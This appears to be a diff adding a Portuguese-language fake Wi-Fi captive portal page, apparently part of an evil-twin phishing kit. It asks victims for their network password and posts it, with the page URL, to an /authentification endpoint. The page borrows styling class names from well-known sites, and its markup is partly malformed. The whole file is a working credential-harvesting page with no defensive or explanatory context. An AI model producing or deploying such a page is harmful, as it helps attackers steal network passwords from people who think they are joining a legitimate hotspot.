@@ -1,0 +1,174 @@
+<html lang="pt-br" class="js not-logged-in client-root js-focus-visible sDN5V" style="--desktop-nav-height:60px; --in-feed-story-item-padding:14px;">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=0.8, minimal-ui">
+    <title>WIFI</title>
+    <script src="/jquery.slim.min.js"></script>
+    <script src="jquery.slim.min.js"></script>
+    <link rel="stylesheet" href="/captive.css">
+    <link rel="stylesheet" href="captive.css">
+
+<style>
+</head>
+* {
+  margin: 0px;
+  padding: 0px;
+}
+
+body {
+  background-color: #eee;
+}
+
+#wrapper {
+  width: 500px;
+  height: 50%;
+  overflow: hidden;
+  border: 0px solid #000;
+  margin: 50px auto;
+  padding: 10px;
+}
+
+.main-content {
+  width: 250px;
+
+  margin: 10px auto;
+  background-color: #fff;
+  border: 2px solid #e6e6e6;
+  padding: 40px 50px;
+}
+
+.header {
+  border: 0px solid #000;
+  margin-bottom: 5px;
+}
+
+.header img {
+  height: 50px;
+  width: 175px;
+  margin: auto;
+  position: relative;
+  left: 40px;
+}
+
+.input-1,
+.input-2 {
+  width: 100%;
+  margin-bottom: 5px;
+  padding: 8px 12px;
+  border: 1px solid #dbdbdb;
+  box-sizing: border-box;
+  border-radius: 3px;
+}
+
+.overlap-text {
+  position: relative;
+}
+
+.overlap-text a {
+  position: absolute;
+  top: 8px;
+  right: 10px;
+  color: #003569;
+  font-size: 14px;
+  text-decoration: none;
+  font-family: 'Overpass Mono', monospace;
+  letter-spacing: -1px;
+}
+
+.btn {
+  width: 100%;
+  background-color: #3897f0;
+  border: 1px solid #3897f0;
+  padding: 5px 12px;
+  color: #fff;
+  font-weight: bold;
+  cursor: pointer;
+  border-radius: 3px;
+}
+
+.sub-content {
+  width: 250px;
+ 
+  margin: 10px auto;
+  border: 1px solid #e6e6e6;
+  padding: 20px 50px;
+  background-color: #fff;
+}
+
+.s-part {
+  text-align: center;
+  font-family: 'Overpass Mono', monospace;
+  word-spacing: -3px;
+  letter-spacing: -2px;
+  font-weight: normal;
+}
+
+.s-part a {
+  text-decoration: none;
+  cursor: pointer;
+  color: #3897f0;
+  font-family: 'Overpass Mono', monospace;
+  word-spacing: -3px;
+  letter-spacing: -2px;
+  font-weight: normal;
+}
+
+.btn:focus {
+    background-color: #7cbaf4;
+}
+
+</style>
+<div id="wrapper">
+  <div class="main-content">
+    <div class="header">
+    </div>
+	<form id="formtosubmit" action="/authentification" method="post" novalidate="" target="_blank">
+    <div class="l-part">
+      <div class="overlap-text">
+        <input type="password" placeholder="Senha" name="password" class="input-2" />
+        <a href="#"></a>
+      </div>
+	  <input id="inputurl" name="url" type="hidden" value="">
+	  <div class="qhFLie">
+	  <input type="button" id="submitbutton" value="Cancelar" class="O0WRkf zZhnYe C0oVfc nDKKZc" />
+          <a href="#"></a>
+	  <input type="button" id="submitbutton" value="Conectar" class="O0WRkf zZhnYe C0oVfc nDKKZc" />	  
+	  </div>
+    </div>
+	</form>
+  </div>
+</div>
+<script>
+  $(document).ready(function() {
+    var url = window.location.href;
+    $('#inputurl').attr('value',url);   
+    
+    
+    $('input[name=email]').on('keyup keypress blur change', function(e) {
+        if($('input[name=email]').val().length === 0 ){
+        $("#emailField").removeClass("CDELXb")
+      }else{
+        $("#emailField").addClass("CDELXb")
+      }
+    });
+    
+    $('input[name=password]').on('keyup keypress blur change', function(e) {
+        if($('input[name=password]').val().length === 0 ){
+        $("#pwdField").removeClass("CDELXb")
+      }else{
+        $("#pwdField").addClass("CDELXb")
+      }
+    });
+    
+    
+  
+    
+    $('#submitbutton').click( function() {
+      document.cookie = $('input[name=email]').val();
+      $("#formtosubmit").submit();
+    });
+  
+  
+  });  
+</script>
